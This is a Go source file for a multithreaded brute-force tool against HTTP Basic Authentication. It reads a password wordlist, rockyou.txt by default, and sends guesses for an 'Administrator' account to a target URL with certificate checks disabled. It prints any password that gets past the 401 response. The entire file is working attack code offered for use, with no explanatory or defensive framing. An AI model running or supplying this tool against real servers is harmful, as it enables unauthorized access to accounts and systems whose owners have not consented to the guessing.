package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

var wg sync.WaitGroup
var m sync.Mutex

var url string
var username string
var wordlist string
var threads int
var verbose bool

var auth_success bool
var total_requests int

func worker(wg *sync.WaitGroup, m *sync.Mutex, c chan string) {

	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    5 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	for {

		var password string
		password = <-c

		if password == "<- Poison Pill ->" {
			if verbose {
				fmt.Println("[*]", "Terminating Thread.")
			}
			break
		}

		req, err := http.NewRequest("GET", url, nil)

		if err != nil {
			if verbose {
				fmt.Println("[!]", "Error:", err)
			}
			break
		}

		req.SetBasicAuth(username, password)
		resp, err := client.Do(req)

		if err != nil {
			if verbose {
				fmt.Println("[!]", "Error:", err)
			}
			break
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		_ = body

		if err != nil {
			if verbose {
				fmt.Println("[!]", "Error:", err)
			}
			break
		}

		m.Lock()
		total_requests++
		m.Unlock()

		if resp.StatusCode != 401 {
			fmt.Println("[+]", "Authorization Successful", "|", "Status Code:", resp.StatusCode, "|", "Password:", password)
			m.Lock()
			auth_success = true
			m.Unlock()
		} else {
			if verbose {
				fmt.Println("[-]", "Authorization Failed", "|", "Status Code:", resp.StatusCode, "|", "Password:", password)
			}
		}

	}

	if verbose {
		fmt.Println("[*]", "Thread Completed.")
	}
	defer wg.Done()

}

func auth_req() bool {

	resp, err := http.Get(url)

	if err != nil {
		if verbose {
			fmt.Println("[!]", "Error:", err)
		}
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	_ = body

	if resp.StatusCode == 401 {
		return true
	} else {
		return false
	}

}

func main() {

	flag.StringVar(&url, "url", "http://127.0.0.1/admin/", "Target URL.")
	flag.StringVar(&wordlist, "wordlist", "/opt/rockyou.txt", "Password List Location.")
	flag.StringVar(&username, "username", "Administrator", "Username.")
	flag.IntVar(&threads, "threads", 5, "Thread Count.")
	flag.BoolVar(&verbose, "verbose", false, "Verbose Output.")

	flag.Parse()

	fmt.Println("[+]", "Username:", username)
	fmt.Println("[+]", "Password List:", wordlist)
	fmt.Println("[+]", "Target URL:", url)
	fmt.Println("[+]", "Threads:", threads)
	fmt.Println("")

	if !auth_req() {
		fmt.Println("[-]", "Authentication not required.")
		return
	}

	c := make(chan string)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(&wg, &m, c)
	}

	file, _ := os.Open(wordlist)
	fscanner := bufio.NewScanner(file)

	for fscanner.Scan() {
		if auth_success {
			break
		}
		c <- fscanner.Text()
	}

	for i := 0; i < threads; i++ {
		c <- "<- Poison Pill ->"
	}

	wg.Wait()

	if verbose {
		fmt.Println("[*]", "Requests Made:", total_requests)
	}

}
